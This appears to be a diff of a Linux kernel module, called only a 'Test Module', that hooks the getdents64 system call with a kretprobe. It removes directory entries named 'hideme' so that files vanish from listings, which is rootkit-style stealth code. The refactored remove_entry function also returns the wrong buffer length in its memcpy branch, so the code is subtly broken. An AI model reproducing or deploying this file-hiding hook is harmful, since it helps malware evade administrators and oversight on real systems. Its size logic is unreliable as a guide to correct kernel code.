@@ -14,10 +14,6 @@
 const char* hide_file_name = "hideme";
 const char* hide_pid_path = "/3504/fd";
 
-struct filter_data {
-    unsigned long hide_entry_offset;
-    unsigned long hide_entry_size;
-};
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
 
@@ -25,7 +21,10 @@ typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
 /// @buffer is the result buffer to store @refitem linux_dirent64
 /// @size of buffer in bytes
 /// @return new buffer size
-static struct filter_data hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
+static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
+
+
+static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);
 
 
 static struct kretprobe kretp = {
@@ -72,32 +71,11 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long buffer_count = regs_return_value(regs);
 
-    struct filter_data filter_data = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, hide_file_name);
+    // hide by name
+    unsigned long new_size = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
+    regs_set_return_value(regs, new_size);
 
     pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
-
-    if(filter_data.hide_entry_offset > 0 && filter_data.hide_entry_size > 0) {
-        // ptr of entry
-        void* dest = args->buffer_ptr + filter_data.hide_entry_offset;
-        // ptr of next entry
-        void* src = dest + filter_data.hide_entry_size;
-        // count of entries from entry to hide to end
-        unsigned long count = buffer_count - filter_data.hide_entry_offset - filter_data.hide_entry_size;
-
-        if(count == 0){
-            // nothing to copy it is last entry
-            regs_set_return_value(regs, buffer_count - filter_data.hide_entry_size);
-        }
-        else {
-            // offset     2
-            // nextOffset 3
-            // [0, 1, 2, 3, 4]
-            // -----[        ] dest
-            // --------[     ] source
-            memcpy(dest, src, count);
-            regs_set_return_value(regs, count);
-        }
-    }
 
 //    unsigned long offset = 0;
 //
@@ -182,22 +160,40 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
 
-struct filter_data hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
-    struct filter_data filter_data;
-
+unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
     unsigned long offset = 0;
 
     // find entry to hide
     while(offset < size){
         struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
         if(entryFilter(current_ent, data) == true){
-            filter_data.hide_entry_offset = offset;
-            filter_data.hide_entry_size = current_ent->d_reclen;
-            return filter_data;
+            return remove_entry(buffer, size, offset, current_ent->d_reclen);
         }
         offset += current_ent->d_reclen;
     }
-    filter_data.hide_entry_offset = -1;
-    filter_data.hide_entry_size = 0;
-    return filter_data;
+
+    return size;
+}
+
+unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size) {
+    // ptr of entry
+    void* dest = buffer + entry_offset;
+    // ptr of next entry
+    void* src = dest + entry_size;
+    // count of entries from entry to hide to end
+    unsigned long count = buffer_size - entry_offset - entry_size;
+
+    if(count == 0){
+        // nothing to copy it is last entry
+        return buffer_size - entry_size;
+    }
+    else {
+        // offset     2
+        // nextOffset 3
+        // [0, 1, 2, 3, 4]
+        // -----[        ] dest
+        // --------[     ] source
+        memcpy(dest, src, count);
+        return count;
+    }
 }
